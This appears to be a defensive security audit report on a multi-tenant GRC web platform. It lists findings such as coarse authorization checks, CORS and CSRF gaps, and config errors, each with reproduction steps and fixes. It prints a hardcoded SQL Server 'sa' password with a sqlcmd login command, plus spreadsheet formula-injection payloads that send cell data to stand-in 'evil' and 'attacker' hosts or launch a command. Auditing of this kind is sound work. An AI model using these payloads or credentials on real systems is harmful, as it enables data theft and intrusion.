title: Function-level authorization too coarse: write operations gated only by isAuthenticated()
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — any authenticated user can create/mutate risk records regardless of role
description: EmergingRiskController (all endpoints), RiskScenarioController (all endpoints incl. create/update/approve/reject/archive), CapaTaskController (list/get/create/transition) and FairCalculatorController guard every operation with @PreAuthorize("isAuthenticated()") rather than the module-permission model (hasPermission('RISK','READ'|'WRITE') / hasPermission('CAPA',…)) used by RiskController, RiskCategoryController, KriAppetiteController and TreatmentPlanController. As a result any authenticated principal — including a read-only AUDITOR or any low-privilege role — can create, mutate, approve, reject and archive emerging risks and scenarios, and create/transition CAPA tasks. Tenant scoping is correctly enforced inside the services (so there is no cross-tenant impact), and CAPA delete is correctly restricted to PLATFORM_ADMIN, but the write-path authorization within a tenant is effectively absent. The approve/reject lifecycle on scenarios is a governance control that should not be available to every role.
rootCause: Inconsistent authorization policy: these controllers were wired to isAuthenticated() instead of the ModulePermissionEvaluator hasPermission('RISK', ACTION) checks applied to the rest of the risk module, so role separation (read vs write, sign-off) is not enforced.
impact: Within a tenant, role separation collapses for these features: a read-only auditor or any authenticated low-privilege user can author and sign off risk scenarios, emerging risks and CAPA tasks. This undermines the segregation-of-duties posture the GRC platform sells (and that SAMA/NCA governance expects), and lets non-risk users tamper with the risk register.
reproduction: 1. Authenticate as a non-risk role (e.g. auditor / Audit@12345). 2. POST /api/risk/scenarios with a valid body — succeeds (201). 3. POST /api/risk/scenarios/{id}/approve — succeeds despite no risk-write/approve authority.
resolution: Replace isAuthenticated() with the module-permission checks: reads -> hasPermission('RISK','READ'), writes/transitions -> hasPermission('RISK','WRITE'); for CAPA use the CAPA module permission (matching how delete already restricts to PLATFORM_ADMIN). Consider a dedicated approve/sign-off permission for the scenario approve/reject endpoints to preserve segregation of duties.
references: OWASP API5:2023 Broken Function Level Authorization

title: Hardcoded SQL Server 'sa' credential (sa/tss.123) committed across ~40 Python bootstrap scripts
cvss: CVSS 5.5 (local/dev-only credential, but committed to VCS and grants full DB sysadmin if the same password is reused in any reachable environment) — risk hinges on credential reuse
description: The SQL Server system administrator credential `sa` / `tss.123` is hard-coded as a literal in the pyodbc connection string of roughly 40 repository-root and `.tools/` Python scripts (setup_*.py, seed_*.py, fix_*.py). All of these files are tracked in git (`git ls-files` confirms they are committed, and none are matched by `.gitignore`). `sa` is the highest-privilege account on a SQL Server instance — full control of every database, ability to read/alter all tenant data, enable xp_cmdshell, etc. While CLAUDE.md documents `sa/tss.123` as the intentional local-dev account, the password is a real, weak, reused secret that now lives permanently in repository history. The concrete risk is credential reuse: if any developer, CI runner, or shared/staging SQL Server instance is provisioned with the same `sa` password (a very common shortcut), this commit hands an attacker sysadmin access to that instance.
rootCause: Connection secrets were inlined as string literals in dev tooling instead of being read from environment variables (the backend already does this via `${DB_PASSWORD}`), so the password is duplicated into ~40 files and baked into git history.
evidence: seed_real_data.py:38-39 — "    'DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost;DATABASE=TSS_GRC;'\n    'UID=sa;PWD=tss.123;Unicode_Results=Yes;'"
impact: Anyone with read access to the repository (or its history) obtains a working sysadmin SQL Server credential. If `tss.123` is reused on any networked/staging instance, this is full database compromise: cross-tenant data exfiltration, tampering, and potential OS command execution via xp_cmdshell. Even confined to localhost dev, it normalises committing real passwords and makes secret rotation impossible without history rewrite.
reproduction: 1. `git log -p -- seed_real_data.py` (or any setup_*.py) shows `UID=sa;PWD=tss.123` in the connection string. 2. From any host that can reach a SQL Server provisioned with this password: `sqlcmd -S <host> -U sa -P tss.123 -Q "SELECT name FROM sys.databases"` succeeds with sysadmin rights.
resolution: Read the connection string from environment variables in every script (e.g. a shared `db_conn()` helper that reads `DB_PASSWORD`, defaulting only for local dev). Rotate the dev `sa` password and never reuse it outside localhost. Add a pre-commit secret scanner (gitleaks/trufflehog). Treat history scrubbing as optional for a dev-only password but mandatory if `tss.123` is ever used beyond a throwaway local instance.
patchBefore:
CONN_STR = (
    'DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost;DATABASE=TSS_GRC;'
    'UID=sa;PWD=tss.123;Unicode_Results=Yes;'
)
conn = pyodbc.connect(CONN_STR)
patchAfter:
import os
CONN_STR = (
    "DRIVER={ODBC Driver 17 for SQL Server};"
    f"SERVER={os.environ.get('DB_HOST','localhost')};DATABASE={os.environ.get('DB_NAME','TSS_GRC')};"
    f"UID={os.environ.get('DB_USERNAME','sa')};PWD={os.environ['DB_PASSWORD']};Unicode_Results=Yes;"
)
conn = pyodbc.connect(CONN_STR)
# DB_PASSWORD must be exported; no default so an unconfigured run fails loudly.
references: OWASP A07:2021 Identification and Authentication Failures

title: Missing function-level authorization on third-party cyber-assessment endpoints (isAuthenticated only)
cvss: CVSS 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N) — any authenticated user can create/approve/retire vendor cyber assessments within their org
description: Every endpoint on ThirdPartyCyberAssessmentController (GET list, GET /{id}, POST create, POST /{id}/posture, POST /{id}/submit, POST /{id}/approve, POST /{id}/retire) is annotated only with @PreAuthorize("isAuthenticated()"). There is no module/action permission (no hasPermission('TPRM',...) / role guard), unlike the rest of the audited TPRM surface which uses hasPermission('TPRM','READ'/'WRITE') or explicit hasAnyRole(...) lists. As a result any authenticated principal — regardless of whether they have any TPRM entitlement (e.g. an AUDITOR, a read-only user, or a user from an unrelated module) — can read, create, edit, submit, and crucially APPROVE and RETIRE third-party cyber risk assessments. The service is correctly tenant-scoped (findByIdAndOrganisationId), so the exposure is confined to the caller's own organisation, but it is a clear privilege/function-level authorization gap (anyone can self-approve risk acceptance).
rootCause: Authorization on this controller was stubbed with isAuthenticated() and never tightened to a module permission or approver role, in contrast to the platform-wide hasPermission('MODULE','ACTION') convention.
impact: Within a tenant, the segregation-of-duties intent of an approve step is voided: a low-privileged user can move a third-party cyber assessment to APPROVED (formal risk acceptance) or RETIRED, and can create/alter posture data that feeds the residual-risk tier. This weakens governance over vendor cyber risk decisions and the associated audit trail.
reproduction: 1. Log in as any authenticated user that has NO TPRM permission (e.g. a user with only a non-TPRM role). 2. curl -X POST http://localhost:8084/api/tprm/cyber-assessments/{id}/approve -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{"approverName":"attacker"}' . The assessment transitions to APPROVED.
resolution: Replace isAuthenticated() with the platform permission convention: hasPermission('TPRM','READ') on reads, hasPermission('TPRM','WRITE') on create/posture/submit, and a tighter approver guard (e.g. hasAnyRole('CISO','RISK_MANAGER','PLATFORM_ADMIN') or hasPermission('TPRM','APPROVE')) on approve/retire.
references: OWASP API5:2023 Broken Function Level Authorization

title: Refresh-token store falls back to organisation_id = 1 when TenantContext is empty
cvss: CVSS ~3.1 — tenant-attribution defect on a non-authorization audit row; no direct cross-tenant data read proven
description: recordIssuance reads orgId from TenantContext and, if null, hard-codes orgId = 1L ("login is the only path where TenantContext isn't yet set"). Both call sites in AuthController do set TenantContext to the principal's / refresh-token's organisationId before calling recordIssuance, so in the normal flows the fallback is not hit. The risk is latent: if a future caller invokes recordIssuance without first populating TenantContext, the refresh-token row is silently mis-attributed to organisation 1 (the seeded TSS GRC tenant). Because the user-facing 'list my sessions' query (listActive/listAll) filters by organisation_id AND user_id, a row stamped with the wrong org would not surface in that user's own session list — i.e. it becomes an invisible/forensically-misleading session record rather than a cross-tenant read. The jti lookup (assertValid/findByJti) is org-agnostic, so refresh/revoke still function regardless of the stamped org.
rootCause: Defensive default that picks an arbitrary concrete tenant id (1) instead of failing closed when the tenant is genuinely unknown.
evidence:
Long orgId = TenantContext.getCurrentTenant();
if (orgId == null) orgId = 1L;   // login is the only path where TenantContext isn't yet set
impact: Refresh-token audit/session rows can be attributed to the wrong tenant if recordIssuance is ever called outside the two current AuthController paths, undermining per-tenant session forensics and the 'list my active sessions' UI. No proven cross-tenant data disclosure today because both real callers set the context first.
reproduction: 1. Call RefreshTokenStoreService.recordIssuance(...) from a code path that has not set TenantContext (e.g. a future scheduled job or test). 2. Observe the persisted platform.refresh_token row has organisation_id = 1 regardless of the user's real org. 3. That user's GET /api/v1/auth/sessions (filtered by their real org) will not list the session.
resolution: Pass the principal's organisationId explicitly into recordIssuance rather than reading it from thread-local, or fail closed (throw) when TenantContext is null instead of defaulting to 1. AuthController already has principal.getOrganisationId() / orgId in scope at both call sites.
patchBefore:
Long orgId = TenantContext.getCurrentTenant();
if (orgId == null) orgId = 1L;   // login is the only path where TenantContext isn't yet set
references: OWASP A01:2021 Broken Access Control (tenant isolation)

title: HMAC key derived from secret using platform-default charset (secret.getBytes())
cvss: CVSS ~2.0 — robustness/portability defect; HMAC strength itself is adequate
description: The signing key is built with Keys.hmacShaKeyFor(secret.getBytes()) — String.getBytes() with no Charset argument, so it uses the JVM default charset. If two nodes (or the rotation tooling) run with different default charsets and the secret contains non-ASCII bytes, the derived key differs and tokens fail to verify across nodes. Separately, validateSecret enforces secret.length() >= 32 characters; for a key with non-ASCII characters the byte length (true entropy fed to HMAC) can differ from the character count, and the length check is on characters not bytes. The default dev secret placeholder is correctly rejected by validateSecret (it contains 'change_me'), so the historic 'known default key' regression is mitigated. The algorithm is HS256 via signWith(secretKey) and verification uses Jwts.parser().verifyWith(secretKey) (JJWT 0.12.6), which pins HMAC verification and rejects alg:none / RS-to-HS confusion — so those classic JWT attacks are NOT present.
rootCause: getBytes() without an explicit StandardCharsets.UTF_8 argument, and a strength check expressed in characters rather than key bytes.
evidence:
this.secretKey = Keys.hmacShaKeyFor(secret.getBytes());  // platform-default charset
if (secret.length() < 32) { throw new IllegalStateException("JWT_SECRET must be at least 32 characters (256 bits)..."); }
impact: Mostly an operational/portability robustness issue: ASCII secrets (the documented recommendation: openssl rand -base64 48) are unaffected, but a non-ASCII secret could cause intermittent token-verification failures across heterogeneous nodes or after a JVM/locale change, and the byte-length of the key is not directly asserted.
reproduction: 1. Set JWT_SECRET to a 32-char string containing multi-byte UTF-8 characters. 2. Run one backend node with file.encoding=UTF-8 and another with a different default charset. 3. Tokens minted on node A may fail signature verification on node B.
resolution: Use secret.getBytes(StandardCharsets.UTF_8) consistently for both the current and previous keys, and validate the resulting key length in bytes (>= 32 bytes = 256 bits) rather than characters.
patchBefore:
this.secretKey = Keys.hmacShaKeyFor(secret.getBytes());
if (secret.length() < 32) { ... }
references: CWE-176: Improper Handling of Unicode Encoding

title: Crisis-comms dispatch trusts client-supplied actor identity and unverified crisisEventId
category: Insufficient verification of data authenticity (A04/A08) — CWE-345
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — audit-trail spoofing / cross-event data placement
description: The dispatch endpoint records WHO dispatched a crisis communication from request body fields dispatchedByName / dispatchedByUserId rather than from the authenticated principal, so an operator can attribute a cascade to any name/user id. Separately, while the template is verified to belong to the tenant (findByOrganisationIdAndIdAndIsDeletedFalse) and to be APPROVED_BY_CISO, the crisisEventId from the request is stored on the CrisisCommsCascade row without verifying that the crisis event exists in the caller's tenant — so a cascade can be filed under an arbitrary or non-existent crisis event id. The recipients list is arbitrary client-supplied strings (validated only @NotBlank); currently harmless because all ChannelSender implementations are stubs, but becomes a sensitive-data/spam vector once real EMAIL/SMS/WhatsApp integrations land.
rootCause: Actor identity and the crisisEventId association are taken from the untrusted request body instead of being derived from the security context (actor) and validated against tenant-scoped repositories (crisisEventId).
evidence: DispatchRequest record fields: `@Size(max=255) String dispatchedByName, Long dispatchedByUserId`. Service: `c.setDispatchedByName(req.dispatchedByName()); c.setDispatchedByUserId(req.dispatchedByUserId()); c.setCrisisEventId(req.crisisEventId());` — no SecurityContext lookup, no crisisEvents.findByIdAndOrganisationId(req.crisisEventId()) check.
impact: An authorized dispatcher can repudiate or misattribute a crisis communication in the audit log, and can associate cascade rows with crisis events that belong to another tenant or do not exist, polluting per-event timelines and undermining the F7 audit trail regulators rely on.
reproduction: 1. As a CISO/COMMS_LEAD, POST /api/v1/bcm/comms/v2/dispatch with dispatchedByName='Someone Else', dispatchedByUserId=<other user> and crisisEventId=<arbitrary>. 2. Observe the persisted cascade + audit row attribute the action to the spoofed identity and the bogus event id.
resolution: Derive dispatchedByName/dispatchedByUserId from SecurityContextHolder (the authenticated GrcUserDetails), ignoring any client-supplied values, and validate req.crisisEventId() with a tenant-scoped crisis-event lookup before persisting the cascade.
references: CWE-345: Insufficient Verification of Data Authenticity
CWE-639: Authorization Bypass Through User-Controlled Key
OWASP A08:2021 Software and Data Integrity Failures

title: CSV/spreadsheet formula injection in BCM audit evidence package export
cvss: CVSS 3.5 (AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N) — code execution on the auditor's machine when opening the export
description: The evidence package generator writes user-controlled free-text fields into audit_log.csv (the AuditLogEntry.message column, plus entityCode/severity) and into the .xlsx sheets (BIA mbco, gap/CAPA descriptions, treatment plans, etc.). The CSV writer's csv() helper only quotes values containing comma/quote/newline; it does NOT neutralise values that begin with =, +, -, @ or tab/CR. When a regulator or external auditor opens the exported CSV/XLSX in Excel or LibreOffice, such a cell is interpreted as a formula (e.g. =cmd|'/c calc'!A1 or =HYPERLINK/WEBSERVICE exfiltration). Because the message text is attacker-influenceable upstream (titles, codes, notes flow into audit messages), a tenant user can plant a malicious formula that executes on the auditor's workstation when the official evidence pack is reviewed.
rootCause: Export routines escape for CSV delimiter safety only, not for spreadsheet formula safety; no leading-character neutralisation is applied before writing user-controlled strings to CSV/XLSX cells.
evidence: csv() helper: `if (v.contains(",") || v.contains("\"") || v.contains("\n")) { return "\"" + v.replace("\"","\"\"") + "\""; } return v;` — a value like `=WEBSERVICE("http://evil/?"&A1)` is emitted verbatim. writeAuditCsv appends csv(e.getMessage()) directly.
impact: Formula injection executing in the context of whoever opens the official BCM evidence bundle (typically an external auditor or SAMA/NCA reviewer) — data exfiltration or command execution on a trusted reviewer's machine, with the file carrying the platform's integrity SHA-256 manifest lending it false trust.
reproduction: 1. Create a BCM artefact whose name/notes is `=HYPERLINK("http://attacker/"&A1,"click")` (or `=cmd|'/c calc'!A1`). 2. Trigger evidence-package generation for the cycle. 3. Open audit_log.csv / the xlsx in Excel — the formula evaluates.
resolution: Prefix any cell value beginning with =, +, -, @, tab or CR with a single quote (or a leading space) before writing, in both the CSV writer and the XLSX cell setters. Centralise this in a sanitizeForSpreadsheet() helper.
references: CWE-1236: Improper Neutralization of Formula Elements in a CSV File

title: CORS configuration bean is never wired into the Spring Security filter chain
cvss: Risk rationale: the declared, over-permissive CORS policy is inert (no .cors() and no addCorsMappings), so the dangerous wildcard+credentials combo does NOT take effect — but the same omission is a latent footgun and a functional defect. Low.
description: CorsConfig declares a CorsConfigurationSource bean named corsConfigurationSource, but the Order(2) securityFilterChain never calls http.cors(...). In Spring Security 6, merely declaring a CorsConfigurationSource bean does NOT auto-activate CORS for the filter chain — you must explicitly call .cors(c -> c.configurationSource(corsConfigurationSource)) (or rely on the default lookup, which still requires the .cors() DSL entry). WebMvcConfig also does not override addCorsMappings, and no CorsFilter/FilterRegistrationBean exists anywhere in the codebase (verified by grep). Consequently the CORS policy is dormant: the API emits no Access-Control-Allow-Origin headers via this configuration. This is simultaneously (a) the mitigating factor that neuters SEC-CFG-003's over-broad dev origins, and (b) a latent risk — the moment someone adds http.cors() to 'fix' cross-origin in dev, the dangerous wildcard+credentials policy in CorsConfig becomes live.
rootCause: The CorsConfig class predates the security-chain refactor; the author assumed bean-by-name auto-detection (which existed in older Spring Security WebSecurityConfigurerAdapter setups) still applies. The Order(2) chain was written without a .cors() call.
impact: Functionally, browser-based cross-origin calls from the dev UI on a different port would not receive CORS headers from this config (may be masked by the static server/proxy). Security-wise the inert state is currently protective, but the disconnect between declared intent (a permissive credentialed CORS policy) and actual wiring is a trap: a future one-line 'fix' silently exposes the over-broad policy of SEC-CFG-003.
reproduction: 1. Start the API. 2. From a browser origin, issue a cross-origin fetch with credentials to /api/**. 3. Observe no Access-Control-Allow-Origin response header is set by CorsConfig. 4. grep the codebase: no .cors(, no addCorsMappings, no CorsFilter — confirming the bean is unconsumed.
resolution: Decide explicitly: if CORS is needed, wire the source via http.cors(c -> c.configurationSource(corsConfigurationSource)) AND first tighten CorsConfig per SEC-CFG-003. If CORS is intentionally handled by the reverse proxy in prod and the static dev server in dev, delete CorsConfig to remove the misleading dead code. Do not leave a permissive-but-dormant policy in the tree.
references: CWE-942: Permissive Cross-domain Policy with Untrusted Domains
Spring Security Reference — CORS (requires explicit http.cors())

title: Over-broad CORS allowedOriginPatterns (10.* / 172.* / 192.168.* on any port) combined with allowCredentials=true
cvss: Risk rationale: dangerous pattern (broad private-IP wildcards + credentials) but only in the dev profile and currently inert because the source is not wired (SEC-CFG-002). Would be Medium/High if wired or copied to prod.
description: The dev profile sets grc.cors.allowed-origins to include broad private-network wildcard patterns: http://192.168.*:[*], http://10.*:[*], http://172.*:[*]. CorsConfig feeds these into setAllowedOriginPatterns(...) with setAllowCredentials(true) and setMaxAge(3600). allowedOriginPatterns is precisely the mechanism that lets wildcards coexist with credentials (which setAllowedOrigins would reject), so the safety net Spring normally provides (no wildcard-with-credentials) is deliberately bypassed. The patterns match the entire RFC-1918 space (10.0.0.0/8, 172.16/12-ish via 172.*, 192.168/16) on ANY port. Any host on those ranges — including an attacker on the same LAN/VPN or a malicious site that can reach a victim's private IP — becomes a trusted credentialed origin. Separately, the PROD profile (application-prod.yml grc: block, lines 106-115) does NOT override grc.cors.allowed-origins, so it inherits the base default http://localhost:3000 (application.yml:145) rather than the documented empty list — a config drift from the stated 'set to empty list in prod' intent (CorsConfig javadoc lines 19-23).
rootCause: Convenience for LAN dev access (reach the dev UI from another machine without per-IP config — comment lines 66-70). Wildcard origin patterns plus allowCredentials were chosen to make this frictionless, trading away origin validation. Prod was never given an explicit empty CORS list, so it silently inherits a localhost default.
impact: If/when the CORS source is wired (see SEC-CFG-002), any origin in the RFC-1918 ranges on any port can make credentialed cross-origin calls and read responses — enabling a malicious page (or co-tenant on a shared dev/staging LAN/VPN) to drive the authenticated API on a victim's behalf and exfiltrate cross-tenant GRC data. The prod default of localhost:3000 means a real browser front-end on the production domain would be CORS-blocked (functional bug) while localhost is needlessly trusted.
reproduction: 1. (After wiring http.cors) From a page served at http://10.13.37.5:9999 in a victim's browser, fetch('https://api-host/api/v1/...', {credentials:'include'}). 2. Observe Access-Control-Allow-Origin echoes the attacker origin and Access-Control-Allow-Credentials: true, allowing the response to be read. 3. For prod drift: deploy with profile prod, inspect effective grc.cors.allowed-origins => http://localhost:3000 (inherited), not empty.
resolution: Replace wildcard ranges with the exact, known dev origins (specific host:port entries). Never combine broad wildcards with allowCredentials=true. In prod, set grc.cors.allowed-origins explicitly to the production front-end origin(s) or an empty list if same-origin via Nginx — do not rely on inheritance of the localhost default.
patchBefore:
# application-dev.yml
allowed-origins: "...,http://192.168.*:[*],http://10.*:[*],http://172.*:[*]"
patchAfter:
# application-dev.yml — enumerate exact dev hosts, no broad RFC-1918 wildcards
allowed-origins: "http://localhost:3000,http://127.0.0.1:3000,http://localhost:8086,http://127.0.0.1:8086,http://<your-dev-machine-ip>:8086"
# application-prod.yml — be explicit
grc:
  cors:
    allowed-origins: "https://grc.yourdomain.sa"   # or "" for same-origin behind Nginx
references: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

title: Multipart upload size limits set under wrong YAML key (server.servlet.multipart) — defaults (1MB/10MB) silently in effect
cvss: Risk rationale: misconfiguration causes overly-restrictive defaults (uploads >1MB fail), not an unbounded-upload DoS. Functional + hardening concern. Low.
description: The multipart limits are declared under server.servlet.multipart (max-file-size: 50MB, max-request-size: 55MB). Spring Boot binds multipart limits from spring.servlet.multipart (MultipartProperties, prefix 'spring.servlet.multipart'), NOT server.servlet.multipart. The 'server.servlet' namespace has no 'multipart' child, so this block is unbound/ignored and the framework defaults apply (max-file-size 1MB, max-request-size 10MB). No @Bean MultipartConfigElement or MultipartResolver overrides it anywhere (verified by grep). Net effect: the evidence-upload feature the comment describes ('Default is 1MB which is too small for real evidence documents') is in fact still capped at the 1MB default. From a security angle this is the inverse of a DoS — limits are too tight rather than too loose — but it is a misconfiguration that defeats an intended control and leaves the real (default) limits undocumented and unreviewed.
rootCause: Wrong configuration prefix: the author placed multipart under 'server.servlet' (alongside encoding) instead of the Spring Boot binding prefix 'spring.servlet.multipart'. The mistake is masked because oversized uploads simply fail with the default-limit error, which can look like an application/file-size rule.
evidence:
server:
  servlet:
    context-path: /
    encoding: { charset: UTF-8, enabled: true, force: true }
    multipart:
      max-file-size: 50MB        # <-- under server.servlet, NOT spring.servlet — ignored
      max-request-size: 55MB
impact: Intended 50MB evidence uploads actually fail at 1MB; operators may not realise the effective limit. Because the limit lives at a non-binding key, multipart resource limits are not actually governed by config and are easy to overlook in a hardening review — a future move of this key to the correct prefix with a too-large value (or 'unlimited') would create an upload-DoS vector.
reproduction: 1. POST a >1MB file to an evidence upload endpoint (e.g. /api/v1/evidence/items/{id}/file). 2. Observe MaxUploadSizeExceededException at ~1MB despite the 50MB config. 3. Confirm by relocating the block to spring.servlet.multipart and re-testing — the 50MB limit then takes effect.
resolution: Move the multipart block to spring.servlet.multipart so it binds to MultipartProperties, and choose deliberate, documented limits aligned to grc.storage.max-file-size-mb (50). Keep request-size modestly above file-size.
patchBefore:
server:
  servlet:
    multipart:
      max-file-size: 50MB
      max-request-size: 55MB
patchAfter:
spring:
  servlet:
    multipart:
      max-file-size: 50MB
      max-request-size: 55MB
      file-size-threshold: 2MB
references: CWE-770: Allocation of Resources Without Limits or Throttling

title: CSRF globally disabled while a long-lived refresh token is stored in a cookie
category: Cross-Site Request Forgery (A01:2021 — Broken Access Control / CWE-352)
cvss: Risk rationale: access-token auth is header-based Bearer (not cookie) so most state-changing API calls are CSRF-immune; residual risk is limited to the cookie-authenticated /api/auth/refresh endpoint and depends on the cookie's SameSite attribute. Low.
description: CSRF protection is disabled on both filter chains (csrf(AbstractHttpConfigurer::disable)). The architectural justification ('not needed for stateless JWT') is sound for the access token, which is carried in the Authorization: Bearer header and stored in sessionStorage — a custom header is not auto-attached by the browser cross-site, so those calls are inherently CSRF-resistant. However the system ALSO uses an HttpOnly refresh-token cookie (7 days) and exposes POST /api/auth/refresh and POST /api/auth/logout as permitAll cookie-authenticated endpoints. Cookies ARE sent automatically by the browser on cross-site requests, so /api/auth/refresh and /api/auth/logout are reachable via CSRF unless the cookie's SameSite attribute blocks it. The prod profile sets server.servlet.session.cookie.same-site=strict (lines 83-89), but that property governs the SERVLET SESSION cookie (JSESSIONID), not the application-issued refresh-token cookie, which is created in AuthController code (outside these config files). If that cookie is not explicitly SameSite=Strict/Lax, a cross-site POST to /api/auth/refresh forces a token refresh (and /api/auth/logout forces a logout — a session-fixation/denial nuisance).
rootCause: Blanket csrf-disable applied to the whole API based on the Bearer-token model, without carving out the cookie-authenticated refresh/logout endpoints. The only cookie hardening present (same-site=strict in prod) targets the servlet session cookie, not the custom refresh cookie set in AuthController.
evidence:
// SecurityConfig
.csrf(AbstractHttpConfigurer::disable)
...
.requestMatchers(HttpMethod.POST, "/api/auth/refresh").permitAll()
.requestMatchers(HttpMethod.POST, "/api/auth/logout").permitAll()
impact: If the refresh cookie lacks a restrictive SameSite, an attacker page can issue a cross-site POST to /api/auth/refresh (token churn / potential token-fixation depending on rotation) or /api/auth/logout (forced logout — availability nuisance). Impact is bounded because the refreshed access token is returned in the response body, which the cross-site attacker cannot read (CORS), so account takeover is not directly achievable via this vector.
reproduction: 1. Log in to obtain the refresh cookie. 2. From an attacker-controlled origin, auto-submit a form POST to https://api-host/api/auth/logout (no custom headers, simple request). 3. If the refresh cookie is sent and not SameSite-blocked, the victim is logged out. 4. Repeat against /api/auth/refresh to observe forced token rotation. 5. Inspect Set-Cookie for the refresh token in AuthController to confirm/deny SameSite.
resolution: Verify the refresh-token cookie is set with SameSite=Strict (or at least Lax), HttpOnly, and Secure in prod. Given SameSite=Strict, CSRF on these endpoints is mitigated. For defence-in-depth, consider keeping CSRF disabled for Bearer-authenticated routes but require a custom header / double-submit token specifically on the cookie-authenticated /api/auth/refresh and /api/auth/logout, or bind refresh to a header-supplied value in addition to the cookie.
patchAfter:
ResponseCookie.from("refreshToken", token)
    .httpOnly(true)
    .secure(true)        // prod
    .sameSite("Strict")  // block cross-site auto-send -> CSRF mitigated
    .path("/api/auth")
    .maxAge(Duration.ofDays(7))
    .build();
references: OWASP CSRF Prevention Cheat Sheet — SameSite cookies

title: Swagger/OpenAPI security chain (Order 1) permits all and is enabled in dev; CSP intentionally relaxed
cvss: Risk rationale: API surface disclosure limited to dev (prod disables springdoc), and the permissive chain only matches doc paths. Low.
description: A dedicated Order(1) filter chain matches /swagger-ui.html, /swagger-ui/**, /v3/api-docs, /v3/api-docs/**, /webjars/** and applies anyRequest().permitAll() with CSRF disabled and, deliberately, NO Content-Security-Policy (comment line 54: 'No CSP restriction: Swagger UI requires inline scripts/styles to render'). The full API spec is therefore served without authentication wherever this chain is active. This is gated by springdoc.swagger-ui.enabled / api-docs.enabled — dev enables both (application-dev.yml:117-122), base defaults swagger-ui to env SWAGGER_ENABLED:false, and prod sets swagger-ui.enabled=false AND api-docs.enabled=false (application-prod.yml:117-121). When springdoc is disabled the doc endpoints 404, so prod exposure is closed. Residual concerns: (1) the security chain still permits these paths regardless of the springdoc flag, so re-enabling springdoc (or any future controller mapped under these prefixes) is exposed without auth and without CSP; (2) the relaxed-CSP Swagger chain has no X-Frame-Options/CSP frame-ancestors, so Swagger UI pages are framable (clickjacking) when enabled; (3) in dev the entire authenticated API surface (every endpoint, schema, example) is published to anyone who can reach the dev port — relevant given the broad LAN CORS/access intent in SEC-CFG-003.
rootCause: Defence-in-depth was traded for Swagger UI rendering convenience: a separate permissive chain with no CSP, gated only by the springdoc enable flags rather than also by the security chain. The permit rules and the enable flags are maintained in two places that can drift.
impact: In dev/staging (or any environment where springdoc is enabled), unauthenticated users reach the complete API documentation, aiding endpoint and parameter discovery for attacks. The missing frame-ancestors/X-Frame-Options on the Swagger chain allows clickjacking of the docs UI where enabled. Prod is protected only by the springdoc disable flags; the security layer itself would still permit the paths if those flags were ever flipped.
reproduction: 1. With profile dev, GET /v3/api-docs and /swagger-ui.html without any Authorization header -> full spec / UI returned. 2. Inspect response headers on /swagger-ui.html -> no Content-Security-Policy, no X-Frame-Options from the Order(1) chain. 3. With profile prod, GET /v3/api-docs -> 404 (springdoc.api-docs.enabled=false).
resolution: Restrict the Swagger paths to non-prod and/or require authentication (or network-restrict to internal IPs) even in dev. Keep the security-chain permit and the springdoc enable flag in sync (ideally make the chain conditional on the same property/profile). Apply at least frame-ancestors 'none' / X-Frame-Options DENY to the Swagger chain to prevent clickjacking; relax only script/style-src as Swagger truly needs.
references: CWE-651: Exposure of WSDL File / API documentation Containing Sensitive Information
CWE-1021: Improper Restriction of Rendered UI Layers (Clickjacking)

title: HSTS header emitted in dev over HTTP (max-age 1 year, includeSubDomains) can poison clients
cvss: Risk rationale: HSTS over plaintext dev can pin a developer's browser to HTTPS for the host for a year; nuisance/availability, low confidentiality impact. Low.
description: The Order(2) chain unconditionally enables HSTS with maxAgeInSeconds(31536000) and includeSubDomains(true) for ALL profiles. The dev profile runs plain HTTP on port 8084 (no server.ssl). Browsers ignore HSTS received over plain HTTP per spec for the response that delivered it, but if the dev server is ever reached over HTTPS (e.g. via a TLS-terminating proxy, or a shared hostname), or a colleague accesses a LAN dev host that also serves other apps on subdomains, the 1-year includeSubDomains HSTS can force HTTPS-only on that hostname and its subdomains — breaking access to sibling plain-HTTP dev services. Conversely, the genuinely valuable HSTS is in prod (TLS on 8443), where it is correct. The issue is the lack of profile-scoping: HSTS belongs to TLS-terminated environments only.
rootCause: Security headers are configured once in a shared chain with no profile awareness; HSTS (a TLS-only directive) is applied even in the plaintext dev profile.
evidence:
.httpStrictTransportSecurity(hsts -> hsts
    .maxAgeInSeconds(31536000)
    .includeSubDomains(true))
// dev runs HTTP: application-dev.yml -> server.port: 8084, no ssl
impact: Developer/QA browsers can be pinned to HTTPS for a dev hostname (and all its subdomains) for a year, breaking access to other plaintext dev services on shared hostnames and causing confusing connection-refused errors that are hard to clear. No direct attacker benefit, but a real operational footgun, especially combined with the LAN-access intent.
reproduction: 1. Front the dev server with any TLS terminator (or access a dev host that has both HTTP and HTTPS). 2. Browser receives Strict-Transport-Security: max-age=31536000; includeSubDomains. 3. Subsequent plain-HTTP access to that host/subdomains is force-upgraded to HTTPS by the browser for a year.
resolution: Scope HSTS to TLS-enabled profiles only (e.g. enable the header block in prod profile / when server.ssl.enabled=true). Optionally lower includeSubDomains unless every subdomain is HTTPS. Leave HSTS fully enabled in prod where it is correct.
patchBefore:
.httpStrictTransportSecurity(hsts -> hsts
    .maxAgeInSeconds(31536000)
    .includeSubDomains(true))
references: CWE-319: Cleartext Transmission of Sensitive Information

title: Regulatory Horizon endpoint gated by isAuthenticated() instead of COMPLIANCE:READ (function-level under-scoping)
cvss: CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) — broader-than-intended read of compliance data
description: GET /api/v1/compliance/regulatory-horizon is annotated @PreAuthorize("isAuthenticated()"), whereas every other compliance read endpoint requires hasPermission('COMPLIANCE','READ'). The service is correctly org-scoped (changes.findHorizon(org, ...)), so there is no cross-tenant leakage, but any authenticated user — even one with no Compliance module permission (e.g. a pure BCM or privacy operator) — can read the full tenant-wide regulatory-change horizon (authorities, citations, impact levels, assignees, effective dates).
rootCause: The controller uses the authentication floor as its authorization rule rather than the module-permission convention used across the compliance package.
impact: Sensitive compliance posture (upcoming regulatory obligations, impact ratings, owner assignments) is readable by any authenticated user regardless of role, exceeding the principle of least privilege for the Compliance module.
